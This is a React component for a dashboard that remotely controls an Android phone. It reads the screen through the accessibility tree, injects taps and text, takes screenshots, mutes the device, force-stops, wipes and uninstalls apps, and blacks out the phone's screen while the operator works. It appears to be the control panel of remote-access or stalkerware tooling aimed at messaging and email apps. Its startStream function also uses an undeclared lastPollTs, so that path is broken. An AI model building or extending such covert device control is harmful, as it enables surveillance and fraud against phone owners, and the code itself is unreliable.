import React, { Suspense, lazy, useState, useRef, useEffect, useCallback } from 'react';
import ScreenReaderRecorder from './ScreenReaderRecorder';
import { useReadScreenPolling } from '../hooks/useReadScreenPolling.js';

const ScreenReaderView = lazy(() => import('./ScreenReaderView.jsx'));

const SYSTEM_ICONS = {
  'com.whatsapp': '💬', 'com.instagram.android': '📸', 'com.facebook.katana': '👤',
  'org.telegram.messenger': '✈️', 'com.snapchat.android': '👻',
  'com.twitter.android': '🐦', 'com.google.android.gm': '📧',
  'com.google.android.chrome': '🌐', 'com.google.android.youtube': '▶️',
};
const appIcon = pkg => SYSTEM_ICONS[pkg] || '📦';

function latencyColor(ms) {
  if (ms === null || ms === undefined) return '#475569';
  if (ms < 100)  return '#22c55e';
  if (ms < 300)  return '#eab308';
  return '#ef4444';
}

function LatencyBadge({ label, ms }) {
  const color = latencyColor(ms);
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 5 }}>
      <span style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 0.8, fontWeight: 600 }}>{label}</span>
      <span style={{
        fontSize: 12, fontWeight: 700, color,
        background: `${color}18`, borderRadius: 5,
        padding: '1px 7px', fontVariantNumeric: 'tabular-nums',
        minWidth: 52, textAlign: 'center', display: 'inline-block',
      }}>
        {ms !== null && ms !== undefined ? `${ms} ms` : '—'}
      </span>
    </div>
  );
}

export default function ControlCenter({ device, sendCommand, results, streamFrame, send, serverLatency, deviceLatency, onTabChange, screenReaderPushData, offlineRecordingVersion, connected }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;
  const devInfo  = device.deviceInfo || {};
  const devW     = devInfo.screenWidth  || null;
  const devH     = devInfo.screenHeight || null;

  // ── Manual keep-awake (device loops every 10 s; dashboard re-triggers every 60 s) ──
  const [keepAwakeActive, setKeepAwakeActive] = useState(false);
  const keepAwakeIntervalRef = useRef(null);

  const startKeepAwake = useCallback(() => {
    sendCommand(deviceId, 'wake_keep_alive_start', {});
    setKeepAwakeActive(true);
    if (keepAwakeIntervalRef.current) clearInterval(keepAwakeIntervalRef.current);
    keepAwakeIntervalRef.current = setInterval(() => {
      sendCommand(deviceId, 'wake_keep_alive_start', {});
    }, 60_000);
  }, [deviceId, sendCommand]);

  const stopKeepAwake = useCallback(() => {
    sendCommand(deviceId, 'wake_keep_alive_stop', {});
    setKeepAwakeActive(false);
    if (keepAwakeIntervalRef.current) { clearInterval(keepAwakeIntervalRef.current); keepAwakeIntervalRef.current = null; }
  }, [deviceId, sendCommand]);

  useEffect(() => () => {
    if (keepAwakeIntervalRef.current) clearInterval(keepAwakeIntervalRef.current);
  }, []);

  // Stop keep-awake when device goes offline
  useEffect(() => {
    if (!isOnline && keepAwakeActive) {
      setKeepAwakeActive(false);
      if (keepAwakeIntervalRef.current) { clearInterval(keepAwakeIntervalRef.current); keepAwakeIntervalRef.current = null; }
    }
  }, [isOnline]);

  // ── Mute toggle ───────────────────────────────────────────────────────
  const [isMuted, setIsMuted] = useState(false);
  const toggleMute = useCallback(() => {
    const next = !isMuted;
    sendCommand(deviceId, next ? 'mute_device' : 'unmute_device', {});
    setIsMuted(next);
  }, [isMuted, deviceId, sendCommand]);

  // ── Stream state (mirrors ScreenControl.jsx for reliable frame delivery) ─
  const [streaming, setStreaming]   = useState(false);
  const [fps, setFps]               = useState(0);
  const [hasFrame, setHasFrame]     = useState(false);
  const [streamIdle, setStreamIdle] = useState(false);
  const frameCountRef   = useRef(0);
  const lastFrameTime   = useRef(null);
  const streamingRef    = useRef(false);
  const autoStopRef     = useRef(null);
  const canvasRef       = useRef(null);
  const screenAreaRef   = useRef(null);
  const rafRef          = useRef(null);
  const idleTimerRef    = useRef(null);
  const paintGenerationRef = useRef(0);
  const screenshotHandledRef = useRef(new Set());
  const [screenshotLoading, setScreenshotLoading] = useState(false);
  const [screenshotStatus, setScreenshotStatus] = useState('');

  const {
    screenData,
    reading: screenReadPending,
    active: screenReading,
    start: startScreenReading,
    stop: stopScreenReading,
    readOnce: readScreenOnce,
  } = useReadScreenPolling({
    deviceId,
    isOnline,
    results,
    sendCommand,
    intervalMs: 150,
  });

  useEffect(() => { streamingRef.current = streaming; }, [streaming]);

  // ── Shared paint helper — identical to ScreenControl.jsx ─────────────
  const paintFrame = useCallback((base64) => {
    if (!base64) return;
    frameCountRef.current += 1;
    const now = Date.now();
    if (lastFrameTime.current) {
      const diff = now - lastFrameTime.current;
      if (diff > 0) setFps(Math.round(1000 / diff));
    }
    lastFrameTime.current = now;
    setStreamIdle(false);
    setHasFrame(true);
    if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
    idleTimerRef.current = setTimeout(() => setStreamIdle(true), 8000);

    const img = new window.Image();
    const generation = ++paintGenerationRef.current;
    img.onload = () => {
      if (generation !== paintGenerationRef.current) return;
      if (rafRef.current) cancelAnimationFrame(rafRef.current);
      rafRef.current = requestAnimationFrame(() => {
        if (generation !== paintGenerationRef.current) return;
        const canvas = canvasRef.current;
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        if (canvas.width !== img.naturalWidth || canvas.height !== img.naturalHeight) {
          canvas.width  = img.naturalWidth  || 360;
          canvas.height = img.naturalHeight || 780;
        }
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
      });
    };
    img.src = `data:image/jpeg;base64,${base64}`;
  }, []);

  // A single screenshot is returned as a normal command result. Paint it in
  // the same phone canvas used by the live accessibility-tree view.
  useEffect(() => {
    const latest = (results || []).find(result =>
      result.command === 'take_screenshot' &&
      result.id &&
      !screenshotHandledRef.current.has(result.id)
    );
    if (!latest) return;

    screenshotHandledRef.current.add(latest.id);
    setScreenshotLoading(false);
    const response = typeof latest.response === 'string'
      ? (() => { try { return JSON.parse(latest.response); } catch (_) { return null; } })()
      : latest.response;

    if (latest.success && response?.success && response.base64) {
      paintFrame(response.base64);
      setScreenshotStatus(`Captured ${response.width || ''}${response.width && response.height ? '×' : ''}${response.height || ''}`);
    } else {
      setScreenshotStatus(response?.error || latest.error || 'Screenshot failed');
    }
  }, [results, paintFrame]);

  const takeScreenshot = useCallback(() => {
    if (!isOnline || screenshotLoading) return;
    setScreenshotLoading(true);
    setScreenshotStatus('');
    sendCommand(deviceId, 'take_screenshot');
  }, [deviceId, isOnline, screenshotLoading, sendCommand]);

  const startStream = useCallback(() => {
    if (streamingRef.current) return;
    // Control-center screen control uses the same immediate accessibility-tree
    // command as Read Screen. There is no JPEG stream, compression, chunking,
    // or screen:update event path involved.
    startScreenReading();
    setStreaming(true);
    frameCountRef.current = 0;
    lastPollTs.current = 0;
    setFps(0);
    setHasFrame(false);
    setStreamIdle(false);
    if (autoStopRef.current) clearTimeout(autoStopRef.current);
    autoStopRef.current = setTimeout(() => {
      if (streamingRef.current) {
        stopScreenReading();
        setStreaming(false);
        setFps(0);
      }
    }, 5 * 60 * 1000);
  }, [startScreenReading, stopScreenReading]);

  const stopStream = useCallback(() => {
    stopScreenReading();
    setStreaming(false);
    setFps(0);
    if (autoStopRef.current) clearTimeout(autoStopRef.current);
  }, [stopScreenReading]);

  useEffect(() => () => {
    if (streamingRef.current) stopScreenReading();
    if (autoStopRef.current) clearTimeout(autoStopRef.current);
    if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
    if (rafRef.current) cancelAnimationFrame(rafRef.current);
  }, [stopScreenReading]);

  // ── Screen touch on stream ────────────────────────────────────────────
  const handleStreamClick = useCallback((e) => {
    if (!streaming || !devW || !devH) return;
    const el = screenAreaRef.current || canvasRef.current;
    if (!el) return;
    const rect = el.getBoundingClientRect();
    const px   = (e.clientX - rect.left) / rect.width;
    const py   = (e.clientY - rect.top)  / rect.height;
    const tx   = Math.round(px * devW);
    const ty   = Math.round(py * devH);
    sendCommand(deviceId, 'touch', { x: tx, y: ty, duration: 100 });
  }, [streaming, devW, devH, deviceId, sendCommand]);

  // ── Block screen ──────────────────────────────────────────────────────
  const [blockActive, setBlockActive] = useState(false);
  const blockScreen = () => {
    const cmd = blockActive ? 'screen_blackout_off' : 'screen_blackout_on';
    sendCommand(deviceId, cmd, {});
    setBlockActive(v => !v);
  };

  // ── Paste / Input ─────────────────────────────────────────────────────
  const [pasteText, setPasteText]       = useState('');
  const [showPasteInput, setShowPasteInput] = useState(false);

  const doPaste = () => {
    if (!pasteText.trim()) return;
    sendCommand(deviceId, 'set_clipboard', { text: pasteText });
    setTimeout(() => sendCommand(deviceId, 'input_text', { text: pasteText }), 200);
    setShowPasteInput(false);
    setPasteText('');
  };

  // ── App Folder ────────────────────────────────────────────────────────
  const [apps, setApps]               = useState([]);
  const [appsLoading, setAppsLoading] = useState(false);
  const [appSearch, setAppSearch]     = useState('');
  const [confirmApp, setConfirmApp]   = useState(null);
  const [showAppDialog, setShowAppDialog] = useState(false);
  const seenApps = useRef(new Set());

  const loadApps = () => {
    setAppsLoading(true);
    sendCommand(deviceId, 'get_installed_apps', {});
  };

  useEffect(() => {
    results.forEach(r => {
      if (r.command === 'get_installed_apps' && r.success && !seenApps.current.has(r.id)) {
        seenApps.current.add(r.id);
        setAppsLoading(false);
        try {
          const d = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
          setApps(d.apps || d.installedApps || []);
        } catch (_) { setAppsLoading(false); }
      }
    });
  }, [results]);

  const filteredApps = apps.filter(a => {
    const q = appSearch.toLowerCase();
    return !q || (a.appName || '').toLowerCase().includes(q) || (a.packageName || '').toLowerCase().includes(q);
  });

  const doAppAction = (action, pkg) => {
    if (['uninstall_app', 'force_stop_app', 'clear_app_data'].includes(action)) {
      setConfirmApp({ action, pkg });
    } else {
      sendCommand(deviceId, action, { packageName: pkg });
    }
  };
  const confirmAndDo = () => {
    if (!confirmApp) return;
    sendCommand(deviceId, confirmApp.action, { packageName: confirmApp.pkg });
    setConfirmApp(null);
  };

  // ── Helper ────────────────────────────────────────────────────────────
  const cmd = (command, params = {}) => sendCommand(deviceId, command, params);

  // ── Stream display size — match ScreenReader for consistent look ─────
  const STREAM_W = 360;
  const STREAM_H = devW && devH ? Math.min(780, Math.round(STREAM_W * devH / devW)) : 640;
  const treeElements = (screenData?.elements || [])
    .filter(el => el?.bounds && (el.text || el.contentDescription || el.hintText || el.clickable || el.editable))
    .slice(0, 120);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 12, paddingBottom: 16 }}>

      {/* ── LATENCY BAR ────────────────────────────────────────────────── */}
      <div style={{
        display: 'flex', alignItems: 'center', gap: 16,
        background: '#1e293b', borderRadius: 10, padding: '7px 14px',
        border: '1px solid #334155', flexWrap: 'wrap',
      }}>
        <span style={{ fontSize: 11, color: '#64748b', fontWeight: 700, textTransform: 'uppercase', letterSpacing: 1, marginRight: 4 }}>
          📡 Latency
        </span>
        <span title="Browser ↔ Server round-trip time">
          <LatencyBadge label="Server" ms={serverLatency} />
        </span>
        <div style={{ width: 1, height: 16, background: '#334155' }} />
        <span title="Server ↔ Android TCP round-trip time (measured server-side)">
          <LatencyBadge label="Device" ms={deviceLatency} />
        </span>
        {deviceLatency === null && isOnline && (
          <span style={{ fontSize: 10, color: '#475569', fontStyle: 'italic' }}>measuring…</span>
        )}
        {!isOnline && (
          <span style={{ fontSize: 10, color: '#ef4444', fontStyle: 'italic', marginLeft: 4 }}>device offline</span>
        )}
        {/* Keep Awake indicator */}
        {isOnline && keepAwakeActive && (
          <div style={{ display: 'flex', alignItems: 'center', gap: 5, fontSize: 10, color: '#22c55e', background: 'rgba(34,197,94,0.08)', borderRadius: 6, padding: '2px 8px', border: '1px solid rgba(34,197,94,0.2)' }}>
            <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#22c55e', display: 'inline-block', animation: 'pulse 2s infinite' }} />
            Keep Awake
          </div>
        )}
        {/* App Folder button — compact, opens dialog */}
        <button
          onClick={() => { setShowAppDialog(true); if (!apps.length) loadApps(); }}
          disabled={!isOnline}
          style={{ marginLeft: 'auto', ...smallBtn('#1e3a5f'), display: 'flex', alignItems: 'center', gap: 5, padding: '4px 12px' }}
        >
          📂 <span style={{ fontSize: 11 }}>App Folder</span>
          {apps.length > 0 && <span style={{ fontSize: 10, color: '#7dd3fc' }}>({apps.length})</span>}
        </button>
      </div>

      {/* ── TOP ROW: Two Phone Frames ──────────────────────────────────── */}
      <div style={{ display: 'flex', gap: 14, alignItems: 'flex-start', flexWrap: 'wrap' }}>

        {/* ── SCREEN CONTROL PHONE ────────────────────────────────────── */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
          <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700, textAlign: 'center' }}>
            📱 Screen Control
          </div>

          {/* Phone bezel */}
          <div style={{
            background: '#1e293b', borderRadius: 24, padding: '14px 10px 10px',
            border: '2px solid #334155', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8,
            boxShadow: '0 4px 20px rgba(0,0,0,0.4)',
          }}>
            {/* Notch */}
            <div style={{ width: 60, height: 6, background: '#334155', borderRadius: 4, marginBottom: 2 }} />

            {/* Stream area */}
            <div
              ref={screenAreaRef}
              style={{
                width: STREAM_W, height: STREAM_H,
                background: '#0f172a', borderRadius: 8, border: '1px solid #1e293b',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                overflow: 'hidden', cursor: streaming ? 'crosshair' : 'default',
                position: 'relative',
              }}
              onClick={handleStreamClick}
            >
              {/* Kept for the one-shot screenshot button. Live control uses
                  the accessibility tree below, not a JPEG frame stream. */}
              <canvas
                ref={canvasRef}
                style={{
                  display: hasFrame ? 'block' : 'none',
                  width: '100%', height: '100%',
                  objectFit: 'fill', borderRadius: 8, pointerEvents: 'none',
                }}
              />
              {screenData && (
                <div style={{ position: 'absolute', inset: 0, overflow: 'hidden', pointerEvents: 'none' }}>
                  {treeElements.map((el, index) => {
                    const b = el.bounds;
                    const left = Math.max(0, (b.left / devW) * 100);
                    const top = Math.max(0, (b.top / devH) * 100);
                    const width = Math.max(1, ((b.right - b.left) / devW) * 100);
                    const height = Math.max(1, ((b.bottom - b.top) / devH) * 100);
                    const label = el.text || el.contentDescription || el.hintText || '';
                    return (
                      <div
                        key={`${el.nodeId || index}-${b.left}-${b.top}`}
                        title={label}
                        style={{
                          position: 'absolute', left: `${left}%`, top: `${top}%`,
                          width: `${width}%`, height: `${height}%`,
                          border: el.clickable ? '1px solid rgba(56,189,248,0.8)' : '1px solid rgba(148,163,184,0.28)',
                          background: el.clickable ? 'rgba(14,116,144,0.12)' : 'rgba(15,23,42,0.08)',
                          color: '#e2e8f0', fontSize: 8, lineHeight: 1.1,
                          overflow: 'hidden', padding: 2, boxSizing: 'border-box',
                        }}
                      >
                        {label}
                      </div>
                    );
                  })}
                  <div style={{
                    position: 'absolute', left: 6, top: 6, right: 6,
                    display: 'flex', justifyContent: 'space-between',
                    color: '#7dd3fc', fontSize: 9, textShadow: '0 1px 3px #020617',
                  }}>
                    <span>{screenData.packageName || 'Accessibility tree'}</span>
                    <span>{screenReadPending ? 'reading…' : `${treeElements.length} elements`}</span>
                  </div>
                </div>
              )}
              {!hasFrame && !screenData && (
                <div style={{ textAlign: 'center', color: '#334155' }}>
                  <div style={{ fontSize: 28 }}>📱</div>
                  <div style={{ fontSize: 11, marginTop: 6 }}>
                    {streaming ? 'Waiting for read_screen…' : 'Start screen read to view'}
                  </div>
                </div>
              )}
              {(hasFrame || screenData) && (
                <div style={{
                  position: 'absolute', top: 4, right: 6,
                  fontSize: 10, color: screenReadPending ? '#f59e0b' : '#22c55e',
                  background: 'rgba(0,0,0,0.5)', borderRadius: 4, padding: '1px 5px',
                }}>
                  {screenReadPending ? '◌ READING' : '● READY'}
                </div>
              )}
              {blockActive && (
                <div style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.6)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                  <span style={{ color: '#ef4444', fontSize: 11, fontWeight: 700 }}>🔲 SCREEN BLOCKED</span>
                </div>
              )}
            </div>

            {/* Controls row */}
            <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', justifyContent: 'center', paddingBottom: 4 }}>
              <button
                onClick={streaming ? stopStream : startStream}
                disabled={!isOnline}
                style={{ ...smallBtn(streaming ? '#7f1d1d' : '#166534'), fontSize: 11 }}
              >
                {streaming ? '⏹ Stop' : '▶ Start Read'}
              </button>
              {streaming && (
                <span style={{ fontSize: 11, color: streamIdle ? '#94a3b8' : '#22c55e', alignSelf: 'center' }}>
                  {screenReadPending ? '◌ reading…' : '● read_screen'}
                </span>
              )}
              <button
                onClick={blockScreen}
                disabled={!isOnline}
                style={{ ...smallBtn(blockActive ? '#dc2626' : '#334155'), fontSize: 11 }}
              >
                {blockActive ? '🔲 Unblock' : '⬛ Block'}
              </button>
              <button
                onClick={takeScreenshot}
                disabled={!isOnline || screenshotLoading}
                title="Capture one screenshot without starting a stream"
                style={{ ...smallBtn('#1d4ed8'), fontSize: 11 }}
              >
                {screenshotLoading ? '⏳ Capturing…' : '📸 Take Screenshot'}
              </button>
            </div>
            {screenshotStatus && (
              <div
                role="status"
                style={{
                  fontSize: 10,
                  color: screenshotStatus.toLowerCase().includes('failed') || screenshotStatus.toLowerCase().includes('error')
                    ? '#ef4444'
                    : '#22c55e',
                  textAlign: 'center',
                }}
              >
                {screenshotStatus}
              </div>
            )}
          </div>
          {devW && devH && (
            <div style={{ fontSize: 10, color: '#475569', textAlign: 'center' }}>{devW}×{devH}</div>
          )}
        </div>

        {/* ── SCREEN READER ────────────────────────────────────────────── */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6, flex: 1, minWidth: 0 }}>
          <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700, textAlign: 'center' }}>
            📺 Screen Reader
          </div>
          <Suspense fallback={<div style={{ minHeight: 160, display: 'grid', placeItems: 'center', color: '#64748b', fontSize: 12 }}>Loading screen reader…</div>}>
            <ScreenReaderView
              device={device}
              sendCommand={sendCommand}
              results={results}
              screenPushData={screenReaderPushData}
              connected={connected}
              sharedPolling={{
                screenData,
                reading: screenReadPending,
                active: screenReading,
                start: startScreenReading,
                stop: stopScreenReading,
                readOnce: readScreenOnce,
              }}
            />
          </Suspense>
        </div>

      </div>

      {/* ── SCREEN READER RECORDER ────────────────────────────────────── */}
      <div style={{
        background: '#1e293b', borderRadius: 12, border: '1px solid #334155',
        padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 10,
      }}>
        <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700 }}>
          🎥 Screen Reader Recorder
        </div>
        <ScreenReaderRecorder
          device={device}
          sendCommand={sendCommand}
          results={results}
          screenReaderPushData={screenReaderPushData}
          offlineRecordingVersion={offlineRecordingVersion}
        />
      </div>

      {/* ── CONTROL PAD ────────────────────────────────────────────────── */}
      <div style={{
        background: '#1e293b', borderRadius: 12, border: '1px solid #334155',
        padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 10,
      }}>
        <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700 }}>
          🎮 Control Pad
        </div>

        {/* Row 0: Screen — Wake | Keep Awake toggle | Storage */}
        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
          <span style={{ fontSize: 10, color: '#475569', width: 56, flexShrink: 0 }}>Screen</span>
          <div style={{ display: 'flex', gap: 8 }}>
            <CtrlBtn
              icon="💡" label="Wake Screen"
              onClick={() => cmd('wake_screen')}
              disabled={!isOnline}
              color="#b45309"
            />
            <CtrlBtn
              icon={keepAwakeActive ? '🌙' : '☀️'}
              label={keepAwakeActive ? 'Stop Keep Awake' : 'Keep Awake'}
              onClick={keepAwakeActive ? stopKeepAwake : startKeepAwake}
              disabled={!isOnline}
              color={keepAwakeActive ? '#7c3aed' : '#92400e'}
            />
            <CtrlBtn
              icon="📂" label="Storage"
              onClick={() => cmd('request_storage_permission')}
              disabled={!isOnline}
              color="#0f766e"
            />
          </div>
        </div>

        {/* Row Audio: Mute toggle */}
        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
          <span style={{ fontSize: 10, color: '#475569', width: 56, flexShrink: 0 }}>Audio</span>
          <div style={{ display: 'flex', gap: 8 }}>
            <CtrlBtn
              icon={isMuted ? '🔇' : '🔔'}
              label={isMuted ? 'Unmute' : 'Mute'}
              onClick={toggleMute}
              disabled={!isOnline}
              color={isMuted ? '#dc2626' : '#1d4ed8'}
            />
          </div>
        </div>

        {/* Row 1: Input — Paste | Enter  (Nav + Swipe are in the Screen Reader panel) */}
        <div style={{ display: 'flex', gap: 8, alignItems: 'flex-start' }}>
          <span style={{ fontSize: 10, color: '#475569', width: 56, flexShrink: 0, paddingTop: 8 }}>Input</span>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 6, flex: 1 }}>
            <div style={{ display: 'flex', gap: 8 }}>
              <CtrlBtn
                icon="📋" label="Paste"
                onClick={() => setShowPasteInput(v => !v)}
                disabled={!isOnline}
                color={showPasteInput ? '#b45309' : undefined}
              />
              <CtrlBtn
                icon="↵" label="Enter"
                onClick={() => cmd('press_enter')}
                disabled={!isOnline}
                color="#7c3aed"
              />
            </div>
            {showPasteInput && (
              <div style={{ display: 'flex', gap: 6 }}>
                <input
                  value={pasteText}
                  onChange={e => setPasteText(e.target.value)}
                  onKeyDown={e => e.key === 'Enter' && doPaste()}
                  placeholder="Text to paste…"
                  autoFocus
                  style={{
                    flex: 1, background: '#0f172a', border: '1px solid #334155',
                    borderRadius: 6, padding: '6px 10px', color: '#f1f5f9', fontSize: 12,
                  }}
                />
                <button
                  onClick={doPaste}
                  disabled={!pasteText.trim() || !isOnline}
                  style={{ ...smallBtn('#1d4ed8') }}
                >
                  Send
                </button>
                <button onClick={() => setShowPasteInput(false)} style={{ ...smallBtn('#334155') }}>✕</button>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* ── APP FOLDER DIALOG ──────────────────────────────────────────── */}
      {showAppDialog && (
        <div style={{
          position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)',
          display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
        }}
          onClick={e => { if (e.target === e.currentTarget) setShowAppDialog(false); }}
        >
          <div style={{
            background: '#1e293b', borderRadius: 14, width: 560, maxWidth: '95vw',
            maxHeight: '80vh', border: '1px solid #334155', display: 'flex', flexDirection: 'column',
            overflow: 'hidden',
          }}>
            {/* Dialog header */}
            <div style={{
              display: 'flex', alignItems: 'center', gap: 10,
              padding: '12px 16px', borderBottom: '1px solid #334155', background: '#162032',
            }}>
              <span style={{ fontWeight: 700, color: '#94a3b8', fontSize: 13, textTransform: 'uppercase', letterSpacing: 1 }}>
                📂 App Folder
              </span>
              {apps.length > 0 && (
                <span style={{ fontSize: 11, color: '#64748b' }}>{apps.length} apps</span>
              )}
              <button onClick={loadApps} disabled={!isOnline || appsLoading} style={{ ...smallBtn('#334155'), fontSize: 11, padding: '3px 10px', marginLeft: 4 }}>
                {appsLoading ? '…' : apps.length ? '↻ Refresh' : '📦 Load Apps'}
              </button>
              {apps.length > 0 && (
                <input
                  value={appSearch}
                  onChange={e => setAppSearch(e.target.value)}
                  placeholder="Search apps…"
                  style={{
                    flex: 1, minWidth: 100, background: '#0f172a', border: '1px solid #334155',
                    borderRadius: 6, padding: '4px 10px', color: '#f1f5f9', fontSize: 12,
                  }}
                />
              )}
              <button
                onClick={() => setShowAppDialog(false)}
                style={{ ...smallBtn('#334155'), fontSize: 15, padding: '3px 10px', marginLeft: 'auto' }}
              >
                ✕ Close
              </button>
            </div>

            {/* App list */}
            <div style={{ flex: 1, overflowY: 'auto', padding: 10 }}>
              {!apps.length && !appsLoading && (
                <div style={{ textAlign: 'center', color: '#475569', padding: '30px 0', fontSize: 13 }}>
                  Click "Load Apps" to see installed apps
                </div>
              )}
              {appsLoading && (
                <div style={{ textAlign: 'center', color: '#64748b', padding: '30px 0', fontSize: 13 }}>Loading apps…</div>
              )}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: 6 }}>
                {filteredApps.map(app => (
                  <AppRow
                    key={app.packageName}
                    app={app}
                    isOnline={isOnline}
                    onLaunch={() => cmd('launch_app', { packageName: app.packageName })}
                    onForceStop={() => doAppAction('force_stop_app', app.packageName)}
                    onUninstall={() => doAppAction('uninstall_app', app.packageName)}
                    onClearData={() => doAppAction('clear_app_data', app.packageName)}
                  />
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── CONFIRM DIALOG ─────────────────────────────────────────────── */}
      {confirmApp && (
        <div style={{
          position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.7)',
          display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 10000,
        }}>
          <div style={{ background: '#1e293b', borderRadius: 12, padding: 24, width: 340, border: '1px solid #334155' }}>
            <div style={{ fontWeight: 700, marginBottom: 8, color: '#f1f5f9' }}>
              Confirm {confirmApp.action.replace(/_/g, ' ')}
            </div>
            <div style={{ color: '#94a3b8', fontSize: 13, marginBottom: 18, wordBreak: 'break-all' }}>
              {confirmApp.pkg}
            </div>
            <div style={{ display: 'flex', gap: 10, justifyContent: 'flex-end' }}>
              <button onClick={() => setConfirmApp(null)} style={{ ...smallBtn('#334155'), color: '#f1f5f9', padding: '7px 16px' }}>Cancel</button>
              <button onClick={confirmAndDo} style={{ ...smallBtn('#dc2626'), padding: '7px 16px' }}>Confirm</button>
            </div>
          </div>
        </div>
      )}

      <style>{`@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }`}</style>
    </div>
  );
}

// ── Sub-components ────────────────────────────────────────────────────────────

function CtrlBtn({ icon, label, onClick, disabled, color }) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      title={label}
      style={{
        width: 48, height: 44, border: 'none', borderRadius: 8,
        background: color || '#334155', color: '#f1f5f9',
        fontSize: 17, cursor: disabled ? 'not-allowed' : 'pointer',
        opacity: disabled ? 0.4 : 1,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        fontWeight: 600, transition: 'background 0.15s', flexShrink: 0,
        flexDirection: 'column', gap: 1,
      }}
    >
      <span>{icon}</span>
      <span style={{ fontSize: 8, color: '#94a3b8', fontWeight: 500 }}>{label}</span>
    </button>
  );
}

function AppRow({ app, isOnline, onLaunch, onForceStop, onUninstall, onClearData }) {
  const [expanded, setExpanded] = useState(false);
  return (
    <div style={{ background: '#162032', borderRadius: 8, border: '1px solid #1e293b', padding: '8px 10px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
        <span style={{ fontSize: 18, flexShrink: 0 }}>{appIcon(app.packageName)}</span>
        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ fontWeight: 600, color: '#f1f5f9', fontSize: 12, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
            {app.appName || app.packageName}
          </div>
          <div style={{ fontSize: 10, color: '#475569', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
            {app.packageName}
          </div>
        </div>
        <button onClick={onLaunch} disabled={!isOnline} title="Launch" style={smallBtnStyle('#166534')}>▶ Open</button>
        <button onClick={() => setExpanded(v => !v)} style={smallBtnStyle('#334155')}>{expanded ? '▲' : '⋯'}</button>
      </div>
      {expanded && (
        <div style={{ display: 'flex', gap: 6, marginTop: 8, flexWrap: 'wrap' }}>
          <button onClick={onForceStop} disabled={!isOnline} style={smallBtnStyle('#92400e')}>⏹ Force Stop</button>
          <button onClick={onClearData} disabled={!isOnline} style={smallBtnStyle('#1e3a5f')}>🗑 Clear Data</button>
          <button onClick={onUninstall} disabled={!isOnline} style={smallBtnStyle('#7f1d1d')}>✕ Uninstall</button>
          {app.versionName && <span style={{ fontSize: 10, color: '#475569', alignSelf: 'center' }}>v{app.versionName}</span>}
        </div>
      )}
    </div>
  );
}

// ── Style helpers ─────────────────────────────────────────────────────────────

const smallBtn = (bg) => ({
  border: 'none', borderRadius: 6, padding: '5px 11px',
  cursor: 'pointer', fontWeight: 600, fontSize: 12,
  background: bg, color: '#f1f5f9',
  whiteSpace: 'nowrap', transition: 'opacity 0.15s',
});

const smallBtnStyle = bg => ({
  border: 'none', borderRadius: 6, padding: '4px 9px',
  cursor: 'pointer', fontWeight: 600, fontSize: 11,
  background: bg, color: '#f1f5f9', whiteSpace: 'nowrap',
});
